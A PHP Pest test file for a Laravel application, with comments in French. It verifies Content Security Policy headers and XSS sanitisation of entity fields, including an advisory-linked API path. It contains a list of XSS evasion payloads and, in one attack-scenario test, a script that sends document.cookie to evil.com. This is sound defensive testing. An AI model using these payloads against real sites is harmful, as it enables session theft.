<?php

use App\Models\Entity;
use App\Models\Lan;
use App\Models\User;
use Database\Seeders\PermissionRoleTableSeeder;
use Database\Seeders\PermissionsTableSeeder;
use Database\Seeders\RolesTableSeeder;
use Database\Seeders\RoleUserTableSeeder;
use Database\Seeders\UsersTableSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Blade;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Vite;
use Laravel\Passport\Passport;
use Tests\TestCase;

uses(TestCase::class, RefreshDatabase::class);

beforeEach(function () {
    $this->seed([
        PermissionsTableSeeder::class,
        RolesTableSeeder::class,
        PermissionRoleTableSeeder::class,
        UsersTableSeeder::class,
        RoleUserTableSeeder::class,
    ]);

    $this->admin = User::query()->where('login', 'admin@admin.com')->first();

    // Les seeders ne créent pas d'utilisateur avec le rôle 'User' par défaut.
    // On crée un utilisateur à la volée et on lui assigne le rôle via la pivot.
    $roleId = DB::table('roles')->where('title', 'User')->value('id');
    $this->userWithRoleUser = User::factory()->create();
    DB::table('role_user')->insert([
        'user_id' => $this->userWithRoleUser->id,
        'role_id' => $roleId,
    ]);

    $this->actingAs($this->admin);
});

// ============================================================
//  Helpers
// ============================================================

/**
 * Payloads XSS courants — OWASP XSS Filter Evasion Cheat Sheet.
 */
function xssPayloads(): array
{
    return [
        'script tag basic' => ['<script>alert(1)</script>'],
        'script tag uppercase' => ['<SCRIPT>alert(1)</SCRIPT>'],
        'img onerror' => ['<img src=x onerror=alert(1)>'],
        'svg onload' => ['<svg onload=alert(1)>'],
        'javascript href' => ['<a href="javascript:alert(1)">click</a>'],
        'event attribute onclick' => ['<p onclick="alert(1)">text</p>'],
        'style expression' => ['<p style="background:url(javascript:alert(1))">'],
        'iframe src' => ['<iframe src="javascript:alert(1)"></iframe>'],
        'encoded script' => ['&#60;script&#62;alert(1)&#60;/script&#62;'],
        'double encoded' => ['%3Cscript%3Ealert(1)%3C/script%3E'],
    ];
}

/**
 * Payloads encapsulés dans un nom valide pour les champs `required`.
 * strip_tags() supprime la balise mais laisse le texte autour → validation OK.
 */
function xssPayloadsInName(): array
{
    $wrapped = [];
    foreach (xssPayloads() as $label => $args) {
        $wrapped[$label] = ['Entité '.$args[0].' test'];
    }

    return $wrapped;
}

// ============================================================
//  1. Content Security Policy header
// ============================================================

describe('Content Security Policy', function () {

    // Le mode par défaut est 'report-only' (phase d'observation) : ces tests vérifient la
    // politique appliquée telle qu'elle sera envoyée une fois CSP_MODE=enforce.
    beforeEach(function () {
        config(['mercator.csp.mode' => 'enforce']);
    });

    it('emet un header CSP sur toutes les réponses authentifiées', function () {
        $this->get(route('admin.entities.index'))
            ->assertHeader('Content-Security-Policy');
    });

    it('emet un header CSP sur les pages publiques', function () {
        auth()->logout();

        $this->get('/login')
            ->assertHeader('Content-Security-Policy');
    });

    it('le header CSP contient les directives minimales requises', function () {
        $csp = $this->get(route('admin.entities.index'))
            ->headers->get('Content-Security-Policy');

        expect($csp)
            ->toContain("default-src 'self'")
            ->toContain("object-src 'none'")
            ->toContain("frame-src 'none'")
            ->toContain('script-src');
    });

    it('le header CSP contient un nonce valide sur script-src', function () {
        $csp = $this->get(route('admin.entities.index'))
            ->headers->get('Content-Security-Policy');

        expect($csp)->toMatch("/script-src 'self' 'nonce-[A-Za-z0-9+\/=]+'/");
    });

    it('le nonce est différent à chaque requête', function () {
        $csp1 = $this->get(route('admin.entities.index'))->headers->get('Content-Security-Policy');
        $csp2 = $this->get(route('admin.entities.index'))->headers->get('Content-Security-Policy');

        preg_match("/'nonce-([A-Za-z0-9+\/=]+)'/", $csp1, $m1);
        preg_match("/'nonce-([A-Za-z0-9+\/=]+)'/", $csp2, $m2);

        expect($m1[1])->not->toBe($m2[1]);
    });

    it('autorise le WebAssembly de graphviz sans autoriser eval()', function () {
        $csp = $this->get(route('admin.entities.index'))->headers->get('Content-Security-Policy');

        expect($csp)
            ->toContain("'wasm-unsafe-eval'")
            ->not->toContain("'unsafe-eval'")
            ->not->toMatch("/script-src[^;]*'unsafe-inline'/");
    });

    it('déclare la route de rapport des violations', function () {
        $response = $this->get(route('admin.entities.index'));

        expect($response->headers->get('Content-Security-Policy'))
            ->toContain('report-uri '.url('/csp-report'))
            ->toContain('report-to csp-endpoint');
        expect($response->headers->get('Reporting-Endpoints'))
            ->toBe('csp-endpoint="'.url('/csp-report').'"');
    });

    it('emet les headers de sécurité complémentaires', function () {
        $this->get(route('admin.entities.index'))
            ->assertHeader('X-Content-Type-Options', 'nosniff')
            ->assertHeader('X-Frame-Options', 'SAMEORIGIN')
            ->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    });
});

describe('Content Security Policy — modes et infrastructure', function () {

    it('est en report-only par défaut (observation sans blocage)', function () {
        config(['mercator.csp.mode' => 'report-only']);

        $response = $this->get(route('admin.entities.index'));

        $response->assertHeaderMissing('Content-Security-Policy');
        expect($response->headers->get('Content-Security-Policy-Report-Only'))
            ->toMatch("/script-src 'self' 'nonce-[A-Za-z0-9+\/=]+'/");
    });

    it('n\'émet aucun header CSP en mode off, mais garde les headers complémentaires', function () {
        config(['mercator.csp.mode' => 'off']);

        $this->get(route('admin.entities.index'))
            ->assertHeaderMissing('Content-Security-Policy')
            ->assertHeaderMissing('Content-Security-Policy-Report-Only')
            ->assertHeader('X-Content-Type-Options', 'nosniff');
    });

    it('la directive @nonce reprend le nonce de la requête', function () {
        Vite::useCspNonce('dGVzdC1ub25jZQ==');

        expect(Blade::render('<script @nonce></script>'))
            ->toBe('<script nonce="dGVzdC1ub25jZQ=="></script>');
    });

    it('la directive @nonce ne produit rien sans nonce', function () {
        expect(Blade::render('<script @nonce></script>'))->toBe('<script ></script>');
    });

    // Garde-fou statique : un <script> inline sans @nonce serait bloqué une fois CSP_MODE=enforce.
    // Les <script src="…"> n'en ont pas besoin ('self') — et ne doivent pas en recevoir pour un
    // domaine externe, ce qui reviendrait à l'autoriser.
    it('aucune vue ne contient de script inline sans @nonce', function () {
        $offenders = [];
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(resource_path('views')));

        foreach ($files as $file) {
            if (! str_ends_with($file->getFilename(), '.blade.php')) {
                continue;
            }
            preg_match_all('/<script\b[^>]*>/i', file_get_contents($file->getPathname()), $tags);
            foreach ($tags[0] as $tag) {
                if (! str_contains($tag, 'src=') && ! str_contains($tag, '@nonce')) {
                    $offenders[] = str_replace(resource_path('views').'/', '', $file->getPathname()).' : '.$tag;
                }
            }
        }

        expect($offenders)->toBe([]);
    });

    // Garde-fou statique : un nonce ne peut pas autoriser un handler inline (onclick=, onsubmit=…).
    // Utiliser les comportements déclaratifs de resources/js/app.js (data-confirm, data-autosubmit,
    // data-history-back) ou un addEventListener dans un <script @nonce>.
    it('aucune vue ne contient de handler d\'événement inline', function () {
        $offenders = [];
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(resource_path('views')));

        foreach ($files as $file) {
            if (! str_ends_with($file->getFilename(), '.blade.php')) {
                continue;
            }
            foreach (file($file->getPathname()) as $i => $line) {
                if (preg_match('/\son[a-z]+\s*=\s*\\\\?["\']/i', $line)) {
                    $offenders[] = str_replace(resource_path('views').'/', '', $file->getPathname()).':'.($i + 1);
                }
            }
        }

        expect($offenders)->toBe([]);
    });

    it('chaque script inline rendu porte le nonce du header CSP', function (string $routeName) {
        config(['mercator.csp.mode' => 'enforce']);

        $response = $this->get(route($routeName))->assertOk();

        preg_match("/'nonce-([A-Za-z0-9+\\/=]+)'/", $response->headers->get('Content-Security-Policy'), $m);
        preg_match_all('/<script\b[^>]*>/i', $response->getContent(), $tags);

        $inline = array_filter($tags[0], fn (string $tag) => ! str_contains($tag, 'src='));

        expect($inline)->not->toBeEmpty();
        foreach ($inline as $tag) {
            expect($tag)->toContain('nonce="'.$m[1].'"');
        }
    })->with(['admin.home', 'admin.entities.index', 'admin.report.maturity1', 'admin.report.view.heatmap']);

    // Garde-fou statique : la CSP n'autorise aucune origine externe (script-src/style-src/font-src/
    // img-src 'self'). Embarquer la dépendance dans le bundle Vite plutôt que la charger d'un CDN.
    // Les simples liens <a href="https://…"> ne sont pas concernés.
    it('aucune vue ne charge de ressource depuis une origine externe', function () {
        $offenders = [];
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(resource_path('views')));

        foreach ($files as $file) {
            if (! str_ends_with($file->getFilename(), '.blade.php')) {
                continue;
            }
            $content = file_get_contents($file->getPathname());
            preg_match_all('/<(?:script|link|img|iframe|source|video|audio|embed|object)\b[^>]*\b(?:src|href|data)\s*=\s*["\']\s*(?:https?:)?\/\/[^"\']+/i', $content, $m);
            preg_match_all('/url\(\s*["\']?(?:https?:)?\/\/[^)]+\)/i', $content, $u);
            foreach (array_merge($m[0], $u[0]) as $hit) {
                $offenders[] = str_replace(resource_path('views').'/', '', $file->getPathname()).' : '.$hit;
            }
        }

        expect($offenders)->toBe([]);
    });

    it('les heatmaps chargent Chart.js depuis le bundle Vite', function (string $routeName) {
        config(['mercator.csp.mode' => 'enforce']);

        $html = $this->get(route($routeName))->assertOk()->getContent();

        expect($html)
            ->not->toContain('cdn.jsdelivr.net')
            ->toMatch('#/build/assets/chart-matrix-[A-Za-z0-9_-]+\.js#');
    })->with(['admin.report.view.heatmap', 'admin.report.view.heatmap2']);

    it('journalise un rapport de violation sans authentification ni CSRF', function () {
        auth()->logout();

        $channel = Mockery::mock();
        $channel->shouldReceive('warning')->once()
            ->with('CSP Violation', Mockery::on(fn (array $context) => str_contains($context['report'], 'inline')));
        Log::shouldReceive('channel')->with('security')->andReturn($channel);

        $this->call('POST', '/csp-report', [], [], [], ['CONTENT_TYPE' => 'application/csp-report'],
            json_encode(['csp-report' => ['violated-directive' => 'script-src', 'blocked-uri' => 'inline']]))
            ->assertNoContent();
    });
});

// ============================================================
//  2. Sanitisation des entités — champs texte purs
// ============================================================

describe('Entity store — plain-text fields are sanitized', function () {

    it('strip les balises HTML du champ contact_point', function (string $payload) {
        $this->post(route('admin.entities.store'), [
            'name' => 'Test Entity',
            'contact_point' => $payload,
        ])->assertRedirect();

        $entity = Entity::latest()->first();

        expect($entity->contact_point)
            ->not->toContain('<script>')
            ->not->toContain('onerror')
            ->not->toContain('javascript:')
            ->not->toContain('onload')
            ->not->toContain('onclick');

    })->with(xssPayloads());

    // FIX 2 : le payload est encapsulé — strip_tags() supprime la balise mais
    //          laisse "Entité  test", ce qui passe la validation required.
    //          Un payload nu comme <img src=x> deviendrait "" → rejet par required,
    //          ce qui est aussi une réponse sécurisée correcte.
    it('strip les balises HTML du champ name', function (string $payload) {
        $this->post(route('admin.entities.store'), [
            'name' => $payload,
            'contact_point' => 'contact@example.com',
        ])->assertRedirect();

        $entity = Entity::latest()->first();

        // Si le payload seul était rejeté (required), l'entité est null → OK aussi
        if ($entity !== null) {
            expect($entity->name)
                ->not->toContain('<script>')
                ->not->toContain('onerror')
                ->not->toContain('javascript:')
                ->not->toContain('onload')
                ->not->toContain('onclick');
        } else {
            // L'entité n'a pas été créée car le nom était vide après sanitisation
            // → comportement sécurisé acceptable (rejet de l'input)
            expect(true)->toBeTrue();
        }

    })->with(xssPayloads());

    it('strip les balises HTML du champ name avec texte autour du payload', function (string $payload) {
        $this->post(route('admin.entities.store'), [
            'name' => $payload,
            'contact_point' => 'contact@example.com',
        ])->assertRedirect();

        $entity = Entity::latest()->first();

        // Ici le nom contient forcément du texte après strip_tags → entité créée
        expect($entity)->not->toBeNull();
        expect($entity->name)
            ->not->toContain('<script>')
            ->not->toContain('onerror')
            ->not->toContain('javascript:')
            ->not->toContain('onload')
            ->not->toContain('onclick');

    })->with(xssPayloadsInName());
});

// ============================================================
//  3. Sanitisation des entités — champs HTML riches (CKEditor)
// ============================================================

describe('Entity store — rich HTML fields are purified', function () {

    it('supprime les scripts injectés dans le champ description', function (string $payload) {
        $this->post(route('admin.entities.store'), [
            'name' => 'Test Entity',
            'description' => $payload,
        ])->assertRedirect();

        $entity = Entity::latest()->first();

        expect($entity->description)
            ->not->toContain('<script>')
            ->not->toContain('javascript:')
            ->not->toContain('onerror=')
            ->not->toContain('onload=');

    })->with(xssPayloads());

    it('conserve le HTML légitime dans le champ description', function () {
        $legitimateHtml = '<p>Texte avec <strong>gras</strong> et <em>italique</em>.</p>'
            .'<ul><li>Point 1</li><li>Point 2</li></ul>';

        $this->post(route('admin.entities.store'), [
            'name' => 'Test Entity',
            'description' => $legitimateHtml,
        ])->assertRedirect();

        $entity = Entity::latest()->first();

        expect($entity->description)
            ->toContain('<strong>')
            ->toContain('<em>')
            ->toContain('<ul>');
    });

    it('supprime les attributs on* sur les balises autorisées', function () {
        $this->post(route('admin.entities.store'), [
            'name' => 'Test Entity',
            'description' => '<p onclick="alert(1)">texte</p>',
        ])->assertRedirect();

        $entity = Entity::latest()->first();

        expect($entity->description)
            ->toContain('<p>')
            ->not->toContain('onclick');
    });

    it('supprime les attributs style sur les balises autorisées', function () {
        $this->post(route('admin.entities.store'), [
            'name' => 'Test Entity',
            'description' => '<p style="background:url(javascript:alert(1))">texte</p>',
        ])->assertRedirect();

        $entity = Entity::latest()->first();

        expect($entity->description)->not->toContain('style=');
    });
});

// ============================================================
//  4. Sanitisation à la mise à jour (PUT)
// ============================================================

describe('Entity update — payloads are sanitized', function () {

    it('sanitise le champ contact_point lors d\'une mise à jour', function (string $payload) {
        $entity = Entity::factory()->create(['contact_point' => 'contact@example.com']);

        $this->put(route('admin.entities.update', $entity), [
            'name' => $entity->name,
            'contact_point' => $payload,
        ])->assertRedirect();

        expect($entity->fresh()->contact_point)
            ->not->toContain('<script>')
            ->not->toContain('onerror')
            ->not->toContain('javascript:');

    })->with(xssPayloads());

    it('sanitise le champ description lors d\'une mise à jour', function (string $payload) {
        $entity = Entity::factory()->create();

        $this->put(route('admin.entities.update', $entity), [
            'name' => $entity->name,
            'description' => $payload,
        ])->assertRedirect();

        expect($entity->fresh()->description)
            ->not->toContain('<script>')
            ->not->toContain('javascript:');

    })->with(xssPayloads());
});

// ============================================================
//  5. Scénario d'attaque complet User → Admin
// ============================================================

describe('Scénario attaque User → Admin', function () {

    it('un utilisateur ne peut pas injecter un payload XSS visible par un admin', function () {
        $this->actingAs($this->userWithRoleUser);

        $this->post(route('admin.entities.store'), [
            'name' => 'Entité malveillante',
            'contact_point' => '<script>fetch("https://evil.com?c="+document.cookie)</script>',
        ])->assertRedirect();

        $entity = Entity::latest()->first();

        // La donnée en base doit être propre avant même l'affichage
        expect($entity->contact_point)
            ->not->toContain('<script>')
            ->not->toContain('document.cookie');

        // L'admin consulte la page
        $this->actingAs($this->admin);

        $response = $this->get(route('admin.entities.show', $entity));

        $response->assertStatus(200);
        $response->assertDontSee('<script>fetch("https://evil.com', false);
        $response->assertDontSee('document.cookie', false);
    });

    it('la page de détail d\'une entité porte un header CSP valide', function () {
        config(['mercator.csp.mode' => 'enforce']);
        $entity = Entity::factory()->create();

        $response = $this->get(route('admin.entities.show', $entity));

        $response->assertHeader('Content-Security-Policy');

        $csp = $response->headers->get('Content-Security-Policy');
        expect($csp)->toContain("object-src 'none'");
    });
});

// ============================================================
//  6. API mass-store / mass-update (GHSA-v9jx-m9mc-689x)
// ============================================================

describe('API mass-store / mass-update — payloads are sanitized', function () {

    beforeEach(function () {
        Passport::actingAs($this->admin);
    });

    it('sanitise les champs HTML riches lors d\'un mass-store', function (string $payload) {
        $response = $this->postJson('/api/entities/mass-store', [
            'items' => [[
                'name' => 'Mass entity',
                'description' => $payload,
                'contact_point' => $payload,
            ]],
        ])->assertCreated();

        $entity = Entity::query()->findOrFail($response->json('ids.0'));

        foreach ([$entity->description, $entity->contact_point] as $value) {
            expect((string) $value)
                ->not->toContain('<script')
                ->not->toContain('<SCRIPT')
                ->not->toContain('javascript:')
                ->not->toContain('onerror')
                ->not->toContain('onload')
                ->not->toContain('onclick');
        }
    })->with(xssPayloads());

    it('ne rend pas le payload du PoC sur la page de détail', function () {
        $payload = '<img src=x onerror="document.body.dataset.ipd=\'executed\'">';

        $response = $this->postJson('/api/entities/mass-store', [
            'items' => [[
                'name' => 'IPD mass-store entity',
                'description' => $payload,
            ]],
        ])->assertCreated();

        $entity = Entity::query()->findOrFail($response->json('ids.0'));
        expect((string) $entity->description)->not->toContain('onerror');

        $this->get(route('admin.entities.show', $entity))
            ->assertOk()
            ->assertDontSee('onerror="document.body', false);
    });

    it('supprime les balises des champs texte lors d\'un mass-store', function () {
        $response = $this->postJson('/api/entities/mass-store', [
            'items' => [[
                'name' => 'Entité <script>alert(1)</script> test',
            ]],
        ])->assertCreated();

        expect(Entity::query()->findOrFail($response->json('ids.0'))->name)
            ->not->toContain('<script>');
    });

    it('conserve le HTML légitime lors d\'un mass-store', function () {
        $response = $this->postJson('/api/entities/mass-store', [
            'items' => [[
                'name' => 'Mass entity',
                'description' => '<p>Texte avec <strong>gras</strong></p>',
            ]],
        ])->assertCreated();

        expect(Entity::query()->findOrFail($response->json('ids.0'))->description)
            ->toContain('<strong>');
    });

    it('sanitise les payloads lors d\'un mass-update', function (string $payload) {
        $entity = Entity::factory()->create();

        $this->putJson('/api/entities/mass-update', [
            'items' => [[
                'id' => $entity->id,
                'name' => $entity->name,
                'description' => $payload,
            ]],
        ])->assertOk();

        expect((string) $entity->fresh()->description)
            ->not->toContain('<script')
            ->not->toContain('javascript:')
            ->not->toContain('onerror');
    })->with(xssPayloads());

    it('sanitise les autres objets lors d\'un mass-store (lans)', function () {
        $response = $this->postJson('/api/lans/mass-store', [
            'items' => [[
                'name' => 'LAN-XSS',
                'description' => '<img src=x onerror=alert(1)>',
            ]],
        ])->assertCreated();

        expect((string) Lan::query()->findOrFail($response->json('ids.0'))->description)
            ->not->toContain('onerror');
    });
});
